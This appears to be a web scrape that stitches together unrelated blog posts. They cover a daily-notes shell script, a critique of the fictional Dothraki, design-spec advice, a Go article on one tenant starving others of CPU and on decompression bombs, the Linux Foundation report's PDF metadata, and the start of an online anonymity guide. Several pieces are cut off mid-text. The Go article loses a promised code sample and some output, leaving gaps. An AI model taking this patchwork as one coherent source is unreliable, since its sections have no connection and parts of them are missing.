file on my desktop. And at the end of the day, I would delete that file and
start over again the next day. Inspired by the minimalism of <a href="https://github.com/todotxt/todo.txt-cli">todo-txt-cli</a>,
I created a similar system to manage my own notes.</p><p>Keep reading for more details or skip to the code: <a href="https://github.com/hachibu/note.sh">github.com/hachibu/note.sh</a>.</p><h4 id="introduction">Introduction</h4><p>As I mentioned before, I used to keep a single notes file on my desktop, and I
would delete it everyday. I would use this notes file to keep track of random
thoughts and details related to my work and personal life. My notes file might
contain code snippets from work, inspirational quotes, or it might have my
latest and greatest open-source software idea, or maybe even the beginning of a
new blog post. Anyway, I loved the simplicity of it, and I didn’t want any more
apps, databases or logins in my life.</p><p>But it wasn’t until I started using <a href="https://github.com/todotxt/todo.txt-cli">todo-txt-cli</a>
that I considered writing a script to manage my own notes. The brilliant part
about <code>todo-txt-cli</code> is that it’s just text files stored in my Dropbox and a
small shell script to interface with those files.</p><p>Inspired by the minimalism of <code>todo-txt-cli</code>, I built <a href="https://github.com/hachibu/note.sh">note.sh</a>.
In total, the entire project consists of 1 Bash script, 1 environment variable
to configure the notes directory and 1 symlink to install it to your
<code>/usr/local/bin</code> directory.</p><h4 id="how-it-works">How It Works</h4><p>The way it works is that every time I run the script, it opens the note for that
day in my editor of choice. For example, if today was December 2, 2020 then the
script would open a file named <code>2020-12-02.md</code> in the notes directory.</p><p>I use Vim as my editor, and I have my notes stored on Dropbox so I can access
them on all of my computers. So, my shell RC file looks like this.</p><div><pre><code data-lang="shell"><span>export</span> <span>EDITOR</span><span>=</span><span>"vim"</span>
<span>export</span> <span>NOTE_DIR</span><span>=</span><span>"</span><span>$HOME</span><span>/Dropbox/Notes"</span>
</code></pre></div><p>And my Dropbox directory looks like this.</p><p><img src="https://hachibu.net/posts/2020/how-i-manage-my-random-daily-notes/images/dropbox-screenshot.png" alt="Dropbox Screenshot"></p><p>For searching, the script accepts a pattern and runs a recursive grep over the
notes directory. I chose grep because I use this script on both Mac and Linux,
and I wanted the script to be as portable as possible.</p><h4 id="conclusion">Conclusion</h4><p>I’ve been using this script for several months across several computers, and I
still love it. I don’t search as often as I thought I would, but it’s comforting
to know it’s all there if I need it. I also ended up creating an alias for my
script so all I need to type is the letter <code>n</code> to run the script.</p><p>In the future, I’d like to add a test suite to the code base, figure out how
to create a Homebrew formula, and add archiving for older notes.</p></div></div>]]>

<p>This is the first part of a three part (II, III) look at the Dothraki, the fictional horse-borne nomads of the <em>Game of Thrones</em> / <em>A Song of Ice and Fire</em> series and the degree to which George R.R. Martin’s claim that they are “an amalgam of a number of steppe and plains cultures” holds up to scrutiny.  This is something that I have been suggesting I would get to since (checks notes),<a href="https://acoup.blog/2019/05/04/new-acquisitions-that-dothraki-charge/"> May.  Of Last Year.</a>  So it is about time we actually get to it.</p>



<p>The plan is for this series to run in three parts.  Part I (this part) will discuss how the Dothraki <em>look</em> in the setting.  Part II will look at broader questions of social organization and culture (I am nearly certain this is one of those cases where there will be a IIa and a IIb, but my hope for brevity springs eternal).  Part III will look at military culture.  In all three parts I am going to use both the books and the show – noting where they diverge – in part because the heaviest characterization the Dothraki got in the show was when Martin was still significantly involved with it (meaning that large parts of it likely still reflect his vision), but also because the show is how the vast majority of people experience this particular fiction.  Both the original text and the show derived from it deserve to have their vision discussed.</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<p>First, a <strong>content warning for this series</strong>: this is discussing <em>A Song of Ice and Fire</em> and <em>Game of Thrones</em> which features a lot of content which is not G-rated.  More to the point, it is a discussion of what – I will argue – Martin presents as one of, if not the most brutal and sexually violent society in that setting.  And that means those themes are going to come up here (less in this essay, but more in the other parts); we are going to remain serious and adult about those things of course, but they will be a part of this analysis nonetheless.  If that is not for you, by all means feel free to check out for a few weeks.</p>



<p>Before we get into the main point, <strong>I want to note that I am going to reference my series on the <a href="https://acoup.blog/2020/01/17/collections-the-fremen-mirage-part-i-war-at-the-dawn-of-civilization/">Fremen Mirage</a> <em>a lot</em> here</strong>, because there is a lot of Fremen stuff going on with how Dothraki society is depicted.  As a result, it may be useful to go back and read those, but just to recap, we may define the Fremen Mirage this way:</p>



<p><a href="https://acoup.blog/2020/02/21/collections-the-fremen-mirage-interlude-ways-of-the-fremen/"><strong>The Fremen Mirage is a literary trope, <em>unconnected to historical reality</em>, which presents societies as a contrast between unsophisticated, but morally pure, hyper-masculine and militarily effective ‘strong men’ societies honed by ‘hard times’ (that is, the Fremen of the term) and a sophisticated but effeminate and decadent ‘weak men’ societies weakened by ‘good times,’ frequently with an implicit assertion of the superior worth of the former.</strong></a></p>



<p>Next, a note on citation here from the books.  My understanding is that different printings of the books have different pagination, which seems to be why the Wiki of Ice and Fire cites by chapter numbers (except that the chapters of the books, as printed, <em>aren’t numbered</em> in the print editions I’ve seen, making this classical-style citation extremely cumbersome and inexact).  I am going to cite by the page numbers of my edition, which is the 2011 Bantam Books Trade Paperback Edition (the box set).  Hopefully that will be enough.</p>



<p>Finally, a note on my expertise here.  <strong>I am not a scholar of either the peoples of the Eurasian Steppe or the American Great Plains</strong>.  The former group does intrude into my period and study, as steppe nomads, in the form of Scythians, Sarmatians and Huns did interact (sometimes peacefully, sometimes violently) with the broader Mediterranean world.  Consequently, my knowledge of steppe peoples tend to be better that my knowledge of the Native American peoples of the Great Plains, but I have tried, within the limits of time and availability, to do my research. <strong> I actually think, in a strange sense, this is useful, because my own initial unfamiliarity with the topic has demonstrated to me just how <em>basic</em> the level of research and reading necessary to avoid the failures of this depiction are</strong>.  You do not, in turns out, need to be an experienced scholar on the topic; just a few books and a couple of emails is enough to already radically improve on what we see and read in <em>A Song of Ice and Fire</em>, much less the absolute <em>mess </em>of what we see in <em>A Game of Thrones</em>.</p>



<p>Writing this has been tricky.  I am well aware that both of these broad cultural groups (that is, Steppe peoples and Plains Native Americans) are often represented in popular culture only in the form of inaccurate and demeaning stereotypes.  I do not want to be just another link in that chain of poor understanding.  I have thus tried to root my argument here, wherever possible, in either the writings of specialist scholars (there will be more of that next week as we get into subsistence patterns, warfare, etc.) or primary evidence, particularly in terms of <em>period photographs</em>, when it comes to clothing and dress.  With luck I have not erred overmuch.</p>

<h2>…But, Why?</h2>



<p>But before we get into the issue proper, it is important to clear away the standard objections, both why subject <em>A Song of Ice and Fire</em> (and its spin-off properties) to critical analysis at all and also why, if we are going to do that, we are going to focus squarely in on the Dothraki.  The answer to the first is something that we’ve rehearsed a number of times, but bears restating: for most of its readers (and the watchers of <em>A Game of Thrones</em>), <em>A Song of Ice and Fire</em> will be their primary exposure to the idea of the Middle Ages.  This is particularly true because of the reputation that the series has for being ‘<a href="https://acoup.blog/2019/05/28/new-acquisitions-not-how-it-was-game-of-thrones-and-the-middle-ages-part-i/">how it really was</a>,’ a reputation that George R.R. Martin has consciously cultivated (as with his classic complaint of <a href="https://youtu.be/p-VxvKoDFIw">‘what was Aragorn’s tax policy’</a> – there is a rich irony that, had Martin understood rulership in the Middle Ages better, he would have understood why Aragorn’s tax policy was less important).  Martin has been quite open that he “<a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">draw[s] inspiration from history</a>” and that fact has long been a selling point of the series over more obviously fantastical kinds of medieval-themed high fantasy as well as a <a href="https://ew.com/article/2015/06/03/george-rr-martin-thrones-violence-women/">response to some of the series’ more controversial moments</a>.</p>



<p><strong>Naturally, that cloak of verisimilitude has tended to intensify the degree to which elements of <em>A Song of Ice and Fire</em> is taken by its readers and viewers as representative of the Middle Ages more generally.</strong>  And of course as I have noted in the (quite recent) past,<strong> <a href="https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/">fiction is often how the public conceptualizes the past and that concept of the past shapes the decisions we make in the present</a></strong>.  In the case of <em>A Song of Ice and Fire</em> in particular, this vision of the past is <a href="https://acoup.blog/2019/06/12/new-acquisitions-how-it-wasnt-game-of-thrones-and-the-middle-ages-part-iii/">particularly worth interrogating</a> because it serves as the basis for a<a href="https://youtu.be/ek2O6bVAIQQ"> parable on power and violence</a>.</p>



<p>But <em>even if it didn’t</em>, it would still be worth discussing these aspects of the universe of <em>A Song of Ice and Fire</em>, because that is what we are supposed to do with cultural products, with <em>literature</em>.  <strong>I am sometimes baffled that the very fans who insist that their particular loves be treated seriously, as <em>art</em> are the same fans who react with frustration if one then sets out to interrogate those same genres the way one would interrogate serious art or literature</strong>.  This is it, after all!  This is what you (we, really) wanted!  A (quite unimpressive, I’ll grant you) ivory tower academic is taking this genre seriously and subjecting it to serious criticism!  Isn’t that what emerging genres often hope for, to be taken seriously as ‘high’ literature?</p>



<p><strong>And of course we should take it seriously.</strong>  And here I want to speak briefly to the purpose of these sorts of endeavors, <strong>because the goal here is not to force anyone to dislike <em>A Song of Ice and Fire</em></strong>.   We’re not here to ‘cancel’ <em>ASOIF</em> any more than we were going to ‘cancel’ <a href="https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/"><em>AC:Valhalla</em> two weeks ago</a> (a game I continue to play, I might add).  Instead, discussing cultural products like this is a form of inoculation against their potentially negative aspects, because once a reader knows that, for instance, the depiction of a given culture in a work of fiction has relatively little to do with any real world culture, they can compartmentalize that to the fiction itself; <strong>it loses its power to mislead</strong> <strong>and so may be enjoyed in safety, as it were</strong>.  And there are good things in <em>A Song of Ice and Fire</em> and in the first six or so seasons of <em>Game of Thrones</em>; but we also need to be honest about the failings.</p>



<p>(Of course, more broadly, doing this as a practice exercise is a key part of building up that skill – what we may term ‘critical reading’ – more generally, rendering the alert reader more resistant to this sort of thing, both in its unintended form (as, I suspect, in this case) or  in its more dangerous<em> intended form</em>.  Put another way, developing critical reading skills is one important way to make one’s self a harder target for misinformation, including historical misinformation.)</p>



<h2>A Dash of Pure Fantasy</h2>



<p>Alright, so <em>A Song of Ice and Fire</em> is worth looking at closely.  So why <em>this</em> part of the fiction?  It comes down to something <a href="https://www.westeros.org/Citadel/SSM/Entry/6040/">George R.R. Martin wrote</a>:</p>



<blockquote><p>The Dothraki were actually fashioned as an amalgam of a number of steppe and plains cultures… Mongols and Huns, certainly, but also …</p></blockquote></div></div>

		<p>Thanks to a conversation I had with <a href="https://twitter.com/jackzerby">Jack Zerby</a> at Gumroad, I now feel confident asking designers to create a user interface, graphic, visual identity, or any other design artifact and have become much more productive at communicating and delegating design tasks. This is essential because my design skills are non-existent. Fortunately, design skills don’t matter in creating a spec, design thinking does. These are my notes from that&nbsp;conversation.</p>
<p>Readers familiar with speccing software or anything else may realize that the advice I’m conveying here matches both your use case and the general case. That, in fact, is the insight that I was missing before the conversation. I already knew how to spec a design, I just needed the right&nbsp;words.</p>
<h3>Step-by-Step&nbsp;Spec</h3>
<p>If you write a spec with all of this information, your designer should have everything they need to get&nbsp;started.</p>
<h4>Step 1: Specify context and&nbsp;canvas</h4>
<p>The canvas is the size and nature of the space the designer has to work in. For graphics, it is the literal dimensions, for software, it is the range of screens that a user might interface with the design from. Web vs mobile is also a canvas&nbsp;question.</p>
<p>Context is what else is nearby. This can mean other aspects of the application as a whole, or it can mean where the user is in a certain process when they encounter the design. If you are asking for a graphic to use on Twitter, that is part of the context, and is very different than asking for a graphic to use on a physical billboard in ways that just the size of the canvas doesn’t fully&nbsp;convey.</p>
<h4>Step 2: List the&nbsp;ingredients</h4>
<p>What actually goes in the design? What information needs to be conveyed? What actions does the user have access to? Be complete, if you don’t list it, the designer won’t know to include&nbsp;it.</p>
<p>An existing stylesheet, illustration, library, or other asset is also an ingredient in the&nbsp;design.</p>
<p>Make sure you have the right number of ingredients for your canvas and context. The more skilled your designer, the more range you get on this, but only to a certain&nbsp;limit.</p>
<h4>Step 3: Identify patterns and&nbsp;hierarchies</h4>
<p>Tell your designer which elements and ingredients are the most important. When you tell your designer the relative importance of the various aspects they use their tools to communicate that importance to the&nbsp;user. </p>
<p>Work with patterns of information within the hierarchy while avoiding identical sections blurring together. Information should match and rhyme, not repeat. But, without a pattern, the design will present friction to the&nbsp;user.</p>
<p>You can communicate hierarchy in words. Lists, especially nested lists, are important here. Order matters, especially in something that can be scrolled&nbsp;through.</p>
<p>If you communicate hierarchy in pictures, don’t go any higher fidelity than a <a href="https://basecamp.com/shapeup/1.3-chapter-04">fat marker sketch</a>. Otherwise, you’ll artificially limit your designer early in the&nbsp;process.</p>
<h4>Step 4: Set&nbsp;tone</h4>
<p>Asking to communicate emotions, impressions, and themes is okay, even good. “X but not Y” is a powerful pattern for doing so, like “minimalist but not empty” or “whimsical but not frivolous.” The more evocative your description, the&nbsp;better.</p>
<h4>Step 5: Send and&nbsp;iterate</h4>
<p>Everything in the spec should be written to avoid friction with the designer. Every time they have to ask you what you mean or you go back and forth on an aspect of your spec, that adds friction to the design process. The faster the turnaround, the more specific your request should be. Specify how many iterations your project merits or your timeline&nbsp;allows.</p>
<p>Design iterations alternate between wide and deep. A “wide” iteration yields several versions of the requested design as a whole. A “deep” iteration takes a chosen design from the wide iteration and comes up with variations on the&nbsp;theme.</p>

<p>Modern languages like Python, NodeJS, and Go make it easy to handle
concurrent requests for multiple customers at the same time by using threads or goroutines.</p>

<p>Such services seem very cost effective because one process can handle hundreds or thousands
of tenants. However, this efficiency comes at a hidden, steep price. When language runtime
scheduling breaks down, one tenant can cause an outage for everyone.</p>

<h2 id="concurrency-made-simple">Concurrency made simple</h2>

<p>Go makes it trivial to handle concurrency.</p>

<p>Here is an example from <a href="https://tour.golang.org/concurrency/1">A Tour Of Go</a> that
launches two goroutines that work independently of each other:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"fmt"</span>
	<span>"time"</span>
)

<span>func</span> <span>say</span>(<span>s</span> <span>string</span>) {
	<span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>5</span>; <span>i</span><span>++</span> {
		<span>time</span>.<span>Sleep</span>(<span>100</span> <span>*</span> <span>time</span>.<span>Millisecond</span>)
		<span>fmt</span>.<span>Println</span>(<span>s</span>)
	}
}

<span>func</span> <span>main</span>() {
	<span>go</span> <span>say</span>(<span>"world"</span>)
	<span>say</span>(<span>"hello"</span>)
}
</code></pre></div>
<p>The Go runtime makes sure that each goroutine gets its fair share of CPU and memory.
It gives the impression that both run in parallel:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS sets system threads to 1</span>
<span># This sets up the go language runtime to use one system thread across</span>
<span># all goroutines. Removing this setting will introduce some parallelism,</span>
<span># but will not solve the problems described in this article.</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run main.go
world
hello
hello
world
...</code></pre></div>
<h2 id="language-runtimes-and-multi-tenancy">Language Runtimes and Multi-Tenancy</h2>

<p>Let’s implement a sample Go SaaS that fetches the contents of a URL
for multiple tenants in parallel:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"net/http"</span>
    <span>"sync"</span>
)

<span>// fetch in our example performs some SaaS work for a tenant,
</span><span>// in this case it gets the URL contents from the internet
</span><span></span><span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>url</span> <span>string</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>// Don't ignore errors in real code, folks, and close the response body
</span><span></span>    <span>re</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
        <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) error -&gt; -&gt;  %v\n"</span>, <span>tenant</span>, <span>err</span>)
        <span>return</span>
    }
    <span>defer</span> <span>re</span>.<span>Body</span>.<span>Close</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v\n"</span>, <span>tenant</span>, <span>re</span>.<span>Status</span>)
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>url</span> <span>:=</span> <span>"http://www.golang.org/"</span>
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>3</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>url</span>)
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>My computer runs the program in no time:</p>
<div><pre><code data-lang="bash">$ go run simple/main.go 
Tenant<span>(</span>2<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>1<span>)</span> -&gt; <span>200</span> OK
Tenant<span>(</span>0<span>)</span> -&gt; <span>200</span> OK</code></pre></div>
<p>We can imagine that the Go runtime executes the program in the following order:</p>
<div><pre><code data-lang="go"><span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>0</span>, <span>"http://golang.org"</span>)
<span>handle0</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle0</span>, <span>goroutine0</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine0</span>)

<span>goroutine0</span> = <span>call</span> <span>work</span> <span>with</span> <span>args</span>(<span>1</span>, <span>"http://golang.org"</span>)
<span>handle1</span> = <span>http</span>.<span>Get</span>(<span>"http://golang.org"</span>)
<span>handles</span>.<span>Add</span>(<span>handle1</span>, <span>goroutine1</span>)
<span>sleepingGoroutines</span>.<span>Add</span>(<span>goroutine1</span>)
<span>...</span>
<span>// main program waits until any function returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>...</span> 
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
<span>// main program waits until any other handle returns data from the internet
</span><span></span><span>handle</span> = <span>epoll</span>(<span>handles</span>)
<span>// Continue execution of goroutine 0
</span><span></span>print(<span>response</span>)
</code></pre></div>
<p>This parallelism and blocking call is an illusion created by a combination of the use of the asynchronous
<a href="https://kovyrin.net/2006/04/13/epoll-asynchronous-network-programming/">epoll</a> Linux function
and Go’s built in runtime scheduler. <code>epoll</code> can efficiently handle thousands of network sockets at once.</p>

<p>The Go runtime activates a smart scheduler to handle <code>go</code> statements - goroutines.
It makes sure that every goroutine gets its share of CPU time and suspends
execution when the function is waiting on network or file input/output.
It’s not unusual to have tens of thousands of goroutines in the system
and see the Go runtime handle the requests well.</p>

<p>If you are interested in a more detailed intro to the Go scheduler, take a look at this article
from <a href="https://www.ardanlabs.com/blog/2018/08/scheduling-in-go-part2.html">Ardan Labs</a>.</p>

<p>This makes Go a great language for handling concurrent network requests
that constitute the bulk of an average software as a service program that reads and writes to a database
or an external service.</p>

<h2 id="when-fair-scheduling-breaks-down">When fair scheduling breaks down</h2>

<p>Language runtimes do not have full control and visibility into
the resource allocation that is done by the Linux kernel.</p>

<p>This is where the multi-tenancy service promise of fair scheduling breaks down.</p>

<p>Take a look at this number-crunching service that computes factorials on demand:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
    <span>"fmt"</span>
    <span>"sync"</span>
    <span>"time"</span>
)

<span>// This implementation has a problem, but our code review did not catch it -
</span><span>// all the engineers were busy arguing on HN.
</span><span></span><span>func</span> <span>factorial</span>(<span>n</span> <span>int64</span>) <span>int64</span> {
    <span>b</span> <span>:=</span> int64(<span>1</span>)
    <span>for</span> <span>i</span> <span>:=</span> int64(<span>1</span>); <span>i</span> <span>&lt;=</span> <span>n</span>; <span>i</span><span>++</span> {
        <span>b</span> <span>*=</span> <span>i</span>
    }
    <span>return</span> <span>b</span>
}

<span>func</span> <span>work</span>(<span>wg</span> <span>*</span><span>sync</span>.<span>WaitGroup</span>, <span>tenant</span> <span>int</span>, <span>number</span> <span>int64</span>) {
    <span>defer</span> <span>wg</span>.<span>Done</span>()
    <span>number</span> = <span>factorial</span>(<span>number</span>)
    <span>end</span> <span>:=</span> <span>time</span>.<span>Now</span>().<span>UTC</span>()
    <span>fmt</span>.<span>Printf</span>(<span>"Tenant(%v) -&gt; %v at %v\n"</span>, <span>tenant</span>, <span>number</span>, <span>end</span>.<span>Format</span>(<span>"15:04:05.000000"</span>))
}

<span>func</span> <span>main</span>() {
    <span>// wg waits for a collection of goroutines to finish
</span><span></span>    <span>// https://golang.org/pkg/sync/#WaitGroup
</span><span></span>    <span>wg</span> <span>:=</span> <span>sync</span>.<span>WaitGroup</span>{}
    <span>for</span> <span>tenant</span> <span>:=</span> <span>0</span>; <span>tenant</span> &lt; <span>10</span>; <span>tenant</span><span>++</span> {
        <span>wg</span>.<span>Add</span>(<span>1</span>)
        <span>// 'go' starts a goroutine, a lightweight thread which is managed by the Go runtime
</span><span></span>        <span>// https://tour.golang.org/concurrency/1
</span><span></span>        <span>if</span> <span>tenant</span> <span>==</span> <span>0</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10000000000</span>)
        } <span>else</span> {
            <span>go</span> <span>work</span>(<span>&amp;</span><span>wg</span>, <span>tenant</span>, <span>10</span><span>+</span>int64(<span>tenant</span>))
        }
    }
    <span>// wait for all goroutines to finish
</span><span></span>    <span>wg</span>.<span>Wait</span>()
}
</code></pre></div>
<p>In this case, you would not observe the same efficient parallelism.</p>

<p>My execution prints:</p>
<div><pre><code data-lang="bash"><span># GOMAXPROCS limits the execution to one CPU</span>
$ GOMAXPROCS<span>=</span><span>1</span> go run fib/main.go

<p>Because of the inefficient factorial implementation that took a lot of iterations
and number crunching, tenant 0 consumed all the CPU time and degraded performance for the others.</p>

<p>We can fix the factorial function and add code that limits the possible input numbers.
However, our service has just suffered an outage due to a bug in the code for all our customers,
<a href="https://goteleport.com/resources/videos/workflow-access-pageduty-slack/">PagerDuty</a> is ringing and we are not sleeping again.</p>

<h2 id="a-real-world-example">A real-world example</h2>

<p>I made up our factorial example, but let’s create a real world one using
decompression bombs.</p>

<p>Decompression bombs are specially crafted archives that are small, but expand
into files ranging from tens to thousands of times their size.</p>

<p>They are specifically designed to take down your service. Anyone can download
one <a href="https://bomb.codes/bombs">from the internet</a>.</p>

<p>Some archives use simple techniques like compressing very large files
filled with zeroes. They take advantage of the fact that compression algorithms
represent a huge file with zeroes with a version of <code>repeat billion zeroes here</code>.</p>

<p>More <a href="https://www.usenix.org/system/files/woot19-paper_fifield_0.pdf">sophisticated approaches</a>
explore compression techniques in depth and craft evil files
that can explode to petabytes of disk space. The danger is real and lots of programs are
vulnerable on the internet right now.</p>

<p>Let’s explore the effect of such archive on a multi-tenant service.
Our new service unpacks the archive and counts the number of words in a file:</p>

<h2 id="resource-isolation-with-cgroups">Resource isolation with cgroups</h2>

<p>The core of the problem is that CPU time is limited. Programming language runtimes lack
the control and context required to efficiently distribute the CPU time per goroutine.</p>

<p>There is no great solution in the modern programming language runtime that solves
this problem once and for all. Some language runtimes, like the <a href="https://hamidreza-s.github.io/erlang/scheduling/real-time/preemptive/migration/2016/02/09/erlang-scheduler-details.html">Erlang</a>
preemptive scheduler provide more isolation and control. Unfortunately, Erlang does not solve
the problem of memory management and its isolation comes with a performance cost.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><a href="https://daniel-lange.com/categories/17-Strategy"><img title="Strategy: Airplanes are interesting toys but of no military value. (Marechal Ferdinand Foch, Professor of Strategy, Ecole Superieure de Guerre)" alt="Strategy" src="https://daniel-lange.com/uploads/strategy.serendipityThumb.jpg"></a></p><p>The Linux Foundation has published its <a href="https://www.linuxfoundation.org/wp-content/uploads/2020/11/2020-Linux-Foundation-Annual-Report_113020.pdf">annual report</a> today. LWN <a href="https://lwn.net/Articles/838871">calls it glossy</a> and yeah, boy, it is shiny.</p>

<p>So shiny that people that work in the publishing industry immediately see this has been produced with the Adobe toolchain which - unfortunately - is one of the big suites of software not yet available for Linux.</p>

<p>Checking the PDF file metadata reveals the keywords "open source, open standards, open hardware, open data". That is what the Linux Foundation is about. Good stuff.</p>

<p><!-- s9ymdb:667 --><img width="552" height="676" src="https://daniel-lange.com/uploads/entries/Linux-Foundation-Annual-Report-2020-cover.jpg" title="Mouseovers are for xkcd!" alt="Linux Foundation annual report 2020 cover"></p>

<p>The PDF producer meta data for the annual report PDF has been set to "Linux kernel 0.12.1 for Workgroups" and the PDF creator meta data element to "Sharp Zaurus XR-5000 (Maemo5) Edition". Somebody thought to better hide the real data and had some tongue-in-cheek ideas. Kudos.</p>

<p>But nicer would have been to use Open Source software to produce the report, not?</p>

<p>Running <code>strings 2020-Linux-Foundation-Annual-Report_113020.pdf | grep Adobe | wc -l</code> gives us 1229 lines and confirms the suspicion of the toolchain.</p>

<p>A stale <code>/Title (Annual Report 2020) /Producer (macOS Version 10.15.7 \(Build 19H15\) Quartz PDFContext)</code> has been forgotten in the document to tell us about the platform.</p>

<p>So, ladies and gentlemen, the Linux Foundation 2020 annual report has been produced on a Mac.</p>

<p>Running Adobe Creative Cloud on MacOS Catalina 10.15.7.</p>

<p>Which is proprietary software. Its kernel (and some userland pieces) are based on BSD. Not Linux.</p>

<hr>

<p>The image on the front page also struck me as a bit odd ... using a ballpoint pen on the laptop screen?</p>

<p>Unbranded laptop.
Unbranded cup in the foreground.</p>

<p>Kid in the background <em>not</em> paying attention to his tablet.</p>

<p>All of that cries stock image so loud it hurts.</p>

<p>Google currently finds ~560 uses of the picture and any <a href="https://www.shutterstock.com/support/article/Do-I-need-to-credit-Shutterstock-the-artist-when-I-use-Images-or-Footage">editorial use</a> nicely tells us that it is © <a href="https://www.shutterstock.com/de/g/draganagordic">Dragana Gordic / Shutterstock</a>.</p>

<p>The image is "Smiling mom working at home with her child on the sofa while writing an email. Young woman working from home, while in quarantine isolation during the Covid-19 health crisis".</p>

<p>See the <a href="https://www.dailymail.co.uk/news/article-8683629/Staff-working-home-nearly-extra-hour-day-research-shows-send-emails.html">Daily Mail</a> for a wonderful example of the working mum in context. I hope, if her laptop had been powered on, it would have run Linux. I mean, what else would still run on an old white MacBook with an Intel "Core 2 Duo" processor from 2008?</p>

<p><!-- s9ymdb:668 --><img width="504" height="742" src="https://daniel-lange.com/uploads/entries/DailyMail-screenshot-stock-image.png" title="O.k., here you go: Shiny, too!" alt="Daily Mail screenshot of the same stock image used"></p>

                </div><div id="extended">
        <p>Bonus round:</p>

<p>The Ethernet port, the USB ports and the headset connector are on the left side of the MacBook. The Daily Mail got it right.</p>

<p>Mirroring images is usually not a good idea. To Linux Foundation's defense ... similar pictures are available <a href="https://www.shutterstock.com/de/image-photo/busy-young-woman-son-home-shot-1680921679">already mirrored on Shutterstuck</a> next to the <a href="https://www.shutterstock.com/de/image-photo/smiling-mom-working-home-her-child-1680923362">correctly oriented picture</a>.</p>

<p>Making a social media account with a pseudonym or artist/brand name is easy. And it’s enough is most use cases to protect your identity as the next George Orwell. There are plenty of people using pseudonyms all over Facebook/Instagram/Twitter/Linkedin/TikTok/Snapchat/Reddit/… But the vast majority of those are anything but anonymous and can easily be traced to their real identity by your local cops, random people within the OSINT<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> (Open-Source Intelligence) community and trolls<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> on 4chan<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>.</p>

<p>This is a good thing as most criminals/trolls are not really tech savvy and will be identified with ease. But this is also a bad thing as most political dissidents, human rights activists and whistleblowers can also be tracked rather easily.</p>

<p>This updated guide aims to provide introduction to various tracking techniques, id verification techniques and guidance to creating and maintaining anonymous identities online including social media accounts safely.</p>

<p>Will this guide help you protect yourself from the NSA, the FSB, Mark Zuckerberg or the Mossad if they’re out to find you? Probably not … Mossad will be doing “Mossad things” <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup> and will probably find you no matter how hard to try to hide<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>.</p>

<p>You have to consider your threat model<sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup> before going further.</p>

<p>Will this guide help you protect your privacy from OSINT researchers like Belingcat<sup id="fnref:7" role="doc-noteref"><a href="#fn:7">7</a></sup> , Doxing<sup id="fnref:8" role="doc-noteref"><a href="#fn:8">8</a></sup> trolls on 4chan<sup id="fnref:9" role="doc-noteref"><a href="#fn:9">9</a></sup> and others that have no access to the NSA toolbox? More likely. Tho I wouldn’t be so sure about 4chan.</p>

<p>It’s also important to understand this guide is the humble result of years of experience and testing from a single individual (myself) and that many of those systems that aim to prevent anonymity are opaque closed-source systems. Most of those guidelines are guessed based on experience. These experiences take a lot of time and resources and are unfortunately far from being scientific. <strong>Your mileage may vary.</strong></p>

<p>You might think this guide has no legitimate use but there are many<sup id="fnref:10" role="doc-noteref"><a href="#fn:10">10</a></sup><sup id="fnref:11" role="doc-noteref"><a href="#fn:11">11</a></sup> such as:</p>

    <p>Evading Censorship</p>

<p>There are many ways you can be tracked besides browser cookies and ads, your e-mail and your phone number. And if you think only the Mossad or the NSA/FSB can find you, you would be terribly wrong.</p>

<p>Here is a non-exhaustive list of some of the many ways you can be de-anonymized:</p>

<h2 id="your-ip-address">Your IP address:</h2>

